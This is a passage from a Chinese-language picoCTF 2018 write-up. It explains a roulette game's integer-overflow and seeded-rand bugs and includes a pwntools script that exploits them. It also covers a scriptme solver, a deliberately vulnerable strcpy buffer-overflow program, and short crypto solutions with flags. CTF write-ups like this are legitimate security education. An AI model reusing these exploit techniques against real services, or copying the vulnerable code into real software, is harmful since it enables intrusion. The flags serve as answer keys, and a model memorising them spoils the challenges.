class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//一些输赢后的提示语</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *win_msgs[NUM_WIN_MSGS] = &#123;</span><br><span class="line">  <span class="string">"Wow.. Nice One!"</span>,</span><br><span class="line">  <span class="string">"You chose correct!"</span>,</span><br><span class="line">  <span class="string">"Winner!"</span>,</span><br><span class="line">  <span class="string">"Wow, you won!"</span>,</span><br><span class="line">  <span class="string">"Alright, now you're cooking!"</span>,</span><br><span class="line">  <span class="string">"Darn.. Here you go"</span>,</span><br><span class="line">  <span class="string">"Darn, you got it right."</span>,</span><br><span class="line">  <span class="string">"You.. win.. this round..."</span>,</span><br><span class="line">  <span class="string">"Congrats!"</span>,</span><br><span class="line">  <span class="string">"You're not cheating are you?"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *lose_msgs1[NUM_LOSE_MSGS] = &#123;</span><br><span class="line">  <span class="string">"WRONG"</span>,</span><br><span class="line">  <span class="string">"Nice try.."</span>,</span><br><span class="line">  <span class="string">"YOU LOSE"</span>,</span><br><span class="line">  <span class="string">"Not this time.."</span>,</span><br><span class="line">  <span class="string">"Better luck next time..."</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *lose_msgs2[NUM_LOSE_MSGS] = &#123;</span><br><span class="line">  <span class="string">"Just give up!"</span>,</span><br><span class="line">  <span class="string">"It's over for you."</span>,</span><br><span class="line">  <span class="string">"Stop wasting your time."</span>,</span><br><span class="line">  <span class="string">"You're never gonna win"</span>,</span><br><span class="line">  <span class="string">"If you keep it up, maybe you'll get the flag in 100000000000 years"</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//模拟转盘效果</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spin_roulette</span><span class="params">(<span class="keyword">long</span> spin)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Roulette  :  "</span>);</span><br><span class="line">  <span class="keyword">int</span> i, j;</span><br><span class="line">  <span class="keyword">int</span> s = <span class="number">12500</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ROULETTE_SPINS; i++) &#123;</span><br><span class="line">    n = <span class="built_in">printf</span>(<span class="string">"%d"</span>, (i%ROULETTE_SIZE)+<span class="number">1</span>);</span><br><span class="line">    usleep(s);</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"\b \b"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (i = ROULETTE_SPINS; i &lt; (ROULETTE_SPINS+ROULETTE_SIZE); i++) &#123;</span><br><span class="line">    n = <span class="built_in">printf</span>(<span class="string">"%d"</span>, (i%ROULETTE_SIZE)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (((i%ROULETTE_SIZE)+<span class="number">1</span>) == spin) &#123;</span><br><span class="line">      <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\b \b"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    usleep(s);</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"\b \b"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; ROULETTE_SIZE; k++) &#123;</span><br><span class="line">    n = <span class="built_in">printf</span>(<span class="string">"%d"</span>, ((i+k)%ROULETTE_SIZE)+<span class="number">1</span>);</span><br><span class="line">    s = <span class="number">1.1</span>*s;</span><br><span class="line">    usleep(s);</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"\b \b"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%ld"</span>, spin);</span><br><span class="line">  usleep(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//生成一个随机数，如果和choice一样，就给cash加双倍bet。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play_roulette</span><span class="params">(<span class="keyword">long</span> choice, <span class="keyword">long</span> bet)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Spinning the Roulette for a chance to win $%lu!\n"</span>, <span class="number">2</span>*bet);</span><br><span class="line">  <span class="keyword">long</span> spin = (rand() % ROULETTE_SIZE)+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  spin_roulette(spin);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (spin == choice) &#123;</span><br><span class="line">    cash += <span class="number">2</span>*bet;</span><br><span class="line">    <span class="built_in">puts</span>(win_msgs[rand()%NUM_WIN_MSGS]);</span><br><span class="line">    wins += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(lose_msgs1[rand()%NUM_LOSE_MSGS]);</span><br><span class="line">    <span class="built_in">puts</span>(lose_msgs2[rand()%NUM_LOSE_MSGS]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获得一笔随机数额的小于5000的初始资金；下注直到cash大于ONE_BILLION(1000000000)且wins大等于HOTSTREAK(3)小于MAX_WINS(16)获得flag。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  cash = get_rand();</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to ONLINE ROULETTE!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Here, have $%ld to start on the house! You'll lose it all anyways &gt;:)\n"</span>, cash);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">long</span> bet;</span><br><span class="line">  <span class="keyword">long</span> choice;</span><br><span class="line">  <span class="keyword">while</span>(cash &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      bet = get_bet();</span><br><span class="line">      cash -= bet;</span><br><span class="line">      choice = get_choice();</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">      </span><br><span class="line">      play_roulette(choice, bet);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (wins &gt;= MAX_WINS) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Wow you won %lu times? Looks like its time for you cash you out.\n"</span>, wins);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Congrats you made $%lu. See you next time!\n"</span>, cash);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(cash &gt; ONE_BILLION) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"*** Current Balance: $%lu ***\n"</span>, cash);</span><br><span class="line">	<span class="keyword">if</span> (wins &gt;= HOTSTREAK) &#123;</span><br><span class="line">	  <span class="built_in">puts</span>(<span class="string">"Wow, I can't believe you did it.. You deserve this flag!"</span>);</span><br><span class="line">	  print_flag();</span><br><span class="line">	  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	  <span class="built_in">puts</span>(<span class="string">"Wait a second... You're not even on a hotstreak! Get out of here cheater!"</span>);</span><br><span class="line">	  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Haha, lost all the money I gave you already? See ya later!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>提示说有两个bug。</p>
+<p>其一出现在第27行，get_Long()函数的<code>uint64_t l = 0;</code> 。函数声明的返回值为<code>long</code> 型，实际返回值为<code>uint64_t</code> 型，前者有符号最大值为<code>LONG_MAX:2^31-1</code> ，后者无符号最大值为<code>ULONG_MAX:2^64-1</code> ，存在向上溢出为负数的风险。</p>
+<p>真正使上溢成为可能的是32-35行 <code>if(l &gt;= LONG_MAX){l = LONG_MAX;  break;}</code> ，这个判断希望控制返回值不超过<code>long</code> 型数据的最大值，但应该写在while循环结束的地方而不是开始的地方，否则只能控制数据进入循环时符合条件，而离开时就不知道了，十倍以内都是可能的，而这足以溢出了。</p>
+<p>到此为止，我们可以控制cash为任意值了，只要输入bet为 <code>当前cash+2^32-目标cash</code> ，在大概率(35/36)输的情况下，我们就能让cash变为想要的值。</p>
+<p>要拿到flag还要求赢至少三次，那问题不大，下小注总会有赢的时候。按概率来算，总是对固定choice下注，可以期望在100次左右赢三次。但题目做了控制，太频繁交互会被禁止连接。于是看看其他的方法。</p>
+<p>如果要改变wins，只能使choice与166行的 <code>long spin = (rand() % ROULETTE_SIZE)+1;</code> 相等，那么会发现这个随机数序列是在第52行播种的，种子就是我们的初始资金，是已知的。于是就可以知道每一次的spin了。EXP搬运自 <a href="https://github.com/sefi-roee/CTFs-Writeups/blob/master/picoCTF-2018/General/18-roulette-350/solution.md" target="_blank" rel="noopener">https://github.com/sefi-roee/CTFs-Writeups/blob/master/picoCTF-2018/General/18-roulette-350/solution.md</a> ，偷个懒就不写了。</p>
+<p><code>picoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_e9328e04}</code> </p>
+<p><img src="1541294444617.png" alt="1541294444617"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#get_rand_seq.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> seed = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    srand(seed);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d,"</span>, rand());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'2018shell1.picoctf.com'</span>, <span class="number">21444</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">lines = r.recvuntil(<span class="string">'&gt; '</span>).split(<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\n'</span>.join(lines)</span><br><span class="line"></span><br><span class="line">balance = int(lines[<span class="number">1</span>].split()[<span class="number">2</span>][<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Start balance: &#123;&#125;"</span>.format(balance))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Predicting random values"</span>)</span><br><span class="line">values = subprocess.check_output([<span class="string">"./get_rand_seq"</span>, str(balance)])</span><br><span class="line">values = values.split(<span class="string">','</span>)</span><br><span class="line">values = [int(v, <span class="number">10</span>) <span class="keyword">for</span> v <span class="keyword">in</span> values[:<span class="number">-1</span>]]</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">ROULETTE_SIZE = <span class="number">36</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">   spin = (values[i] % ROULETTE_SIZE) + <span class="number">1</span></span><br><span class="line">   i += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">   log.info(<span class="string">"Putting &#123;&#125;$ on &#123;&#125;"</span>.format(balance, spin))</span><br><span class="line"></span><br><span class="line">   r.sendline(<span class="string">"&#123;&#125;"</span>.format(balance))</span><br><span class="line">   r.sendline(<span class="string">"&#123;&#125;"</span>.format(spin))</span><br><span class="line"></span><br><span class="line">   balance *= <span class="number">2</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">print</span> r.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">print</span> r.recv()</span><br><span class="line"></span><br><span class="line">spin = (values[i] % ROULETTE_SIZE) + <span class="number">1</span></span><br><span class="line">i += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Putting &#123;&#125;$ on &#123;&#125;"</span>.format(<span class="number">11474836400</span>, spin))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"&#123;&#125;"</span>.format(<span class="number">11474836400</span>)) <span class="comment"># Put some negative numbers, bug in get_long</span></span><br><span class="line">r.sendline(<span class="string">"&#123;&#125;"</span>.format((spin + <span class="number">1</span>) % <span class="number">36</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'You deserve this flag!'</span>)</span><br><span class="line"><span class="keyword">print</span> r.recvall()</span><br><span class="line"></span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
+<h2 id="scriptme"><a href="#scriptme" class="headerlink" title="scriptme"></a>scriptme</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/bintest<span class="comment"># nc 2018shell2.picoctf.com 61344</span></span><br><span class="line">Rules:</span><br><span class="line">() + () = ()()                                      =&gt; [combine]</span><br><span class="line">((())) + () = ((())())                              =&gt; [absorb-right]</span><br><span class="line">() + ((())) = (()(()))                              =&gt; [absorb-left]</span><br><span class="line">(())(()) + () = (())(()())                          =&gt; [combined-absorb-right]</span><br><span class="line">() + (())(()) = (()())(())                          =&gt; [combined-absorb-left]</span><br><span class="line">(())(()) + ((())) = ((())(())(()))                  =&gt; [absorb-combined-right]</span><br><span class="line">((())) + (())(()) = ((())(())(()))                  =&gt; [absorb-combined-left]</span><br><span class="line">() + (()) + ((())) = (()()) + ((())) = ((()())(())) =&gt; [left-associative]</span><br><span class="line"></span><br><span class="line">Example: </span><br><span class="line">(()) + () = () + (()) = (()())</span><br><span class="line"></span><br><span class="line">Let<span class="string">'s start with a warmup.</span></span><br><span class="line"><span class="string">(()()()) + (()) = ???</span></span><br></pre></td></tr></table></figure>
+<p>solve.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">depth</span><span class="params">(s)</span>:</span></span><br><span class="line">    cnt=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(len(s)!=<span class="number">0</span>):</span><br><span class="line">        s=s.replace(<span class="string">'()'</span>,<span class="string">''</span>)</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> cnt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(s1,s2)</span>:</span></span><br><span class="line">    d1=depth(s1)</span><br><span class="line">    d2=depth(s2)</span><br><span class="line">    <span class="keyword">if</span> d1==d2:</span><br><span class="line">        <span class="keyword">return</span> s1+s2</span><br><span class="line">    <span class="keyword">if</span> d1&lt;d2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s%s)"</span>%(s1,s2[<span class="number">1</span>:<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">if</span> d1&gt;d2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s%s)"</span>%(s1[<span class="number">1</span>:<span class="number">-1</span>],s2)</span><br><span class="line">solve = <span class="keyword">lambda</span> x:reduce(calc,x.replace(<span class="string">" "</span>,<span class="string">''</span>).split(<span class="string">'+'</span>))</span><br><span class="line"></span><br><span class="line">host = <span class="string">'2018shell2.picoctf.com'</span></span><br><span class="line">port = <span class="number">61344</span></span><br><span class="line">r=remote(host,port)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		lines=r.recvuntil(<span class="string">'\n&gt;'</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'\n'</span>.join(lines)</span><br><span class="line">		din=lines[<span class="number">-3</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]</span><br><span class="line">		r.sendline(solve(din))</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">print</span> r.recv()</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
+<p><code>picoCTF{5cr1pt1nG_l1k3_4_pRo_cde4078d}</code> </p>
+<h1 id="binary-exploitation"><a href="#binary-exploitation" class="headerlink" title="binary exploitation"></a>binary exploitation</h1><h2 id="buffer-overflow-0"><a href="#buffer-overflow-0" class="headerlink" title="buffer overflow 0"></a>buffer overflow 0</h2><p><code>picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}</code> </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAGSIZE_MAX 64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> flag[FLAGSIZE_MAX];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigsegv_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>, flag);</span><br><span class="line">  fflush(<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *input)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  FILE *f = fopen(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag,FLAGSIZE_MAX,f);</span><br><span class="line">  signal(SIGSEGV, sigsegv_handler);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    vuln(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Thanks! Received: %s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This program takes 1 argument.\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h1><h2 id="Crypto-Warmup-1"><a href="#Crypto-Warmup-1" class="headerlink" title="Crypto Warmup 1"></a>Crypto Warmup 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"picoCTF&#123;%s&#125;"</span>%<span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:chr((ord(x[<span class="number">0</span>])-ord(x[<span class="number">1</span>]))%<span class="number">26</span>+ord(<span class="string">'a'</span>)),zip(<span class="string">'llkjmlmpadkkc'</span>,<span class="string">'thisisalilkey'</span>))).upper()</span><br><span class="line">picoCTF&#123;SECRETMESSAGE&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="caesar-cipher-2"><a href="#caesar-cipher-2" class="headerlink" title="caesar cipher 2"></a>caesar cipher 2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:chr((ord(x)+<span class="number">32</span>)%<span class="number">0xff</span>),<span class="string">'PICO#4&amp;[C!ESA2?#I0H%R3?JU34?A2%N4?S%C5R%]'</span>))</span><br><span class="line"><span class="comment"># 'picoCTF&#123;cAesaR_CiPhErS_juST_aREnT_sEcUrE&#125;'</span></span><br></pre></td></tr></table></figure>
+<h2 id="hertz"><a href="#hertz" class="headerlink" title="hertz"></a>hertz</h2><p>替换密码。</p>
+<p>在线工具：</p>
+<ul>
+<li><a href="https://www.guballa.de/substitution-solver" target="_blank" rel="noopener">https://www.guballa.de/substitution-solver</a> </li>
+<li><a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a> </li>
+</ul>
+<p><img src="1541076904847.png" alt="1541076904847"></p>
+<h2 id="blaise’s-cipher"><a href="#blaise’s-cipher" class="headerlink" title="blaise’s cipher"></a>blaise’s cipher</h2><p>在线解密即可：<a href="https://www.dcode.fr/vigenere-cipher" target="_blank" rel="noopener">https://www.dcode.fr/vigenere-cipher</a> 。逐步得到KEY长度为4，KEY为<code>FLAG</code></p>
+<p><code>picoCTF{v1gn3r3_c1ph3rs_ar3n7_bad_901e13a1}</code> </p>
+<p>## </p>
+<h2 id="Safe-RSA"><a href="#Safe-RSA" class="headerlink" title="Safe RSA"></a>Safe RSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,binascii</span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">c=<span class="number">2205316413931134031046440767620541984801091216351222789180593875373829950860542792110364325728088504479780803714561464250589795961097670884274813261496112882580892020487261058118157619586156815531561455215290361274334977137261636930849125</span></span><br><span class="line">m=gmpy2.iroot(c,e)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> binascii.unhexlify(hex(m).strip(<span class="string">'lL'</span>)[<span class="number">2</span>:])</span><br><span class="line"><span class="comment"># picoCTF&#123;e_w4y_t00_sm411_9f5d2464&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="【X】Super-Safe-RSA"><a href="#【X】Super-Safe-RSA" class="headerlink" title="【X】Super Safe RSA"></a>【X】Super Safe RSA</h2><p>参考<a href="https://findneo.github.io/180727rsa-attack/#广播攻击">RSA的广播攻击</a> 。</p>
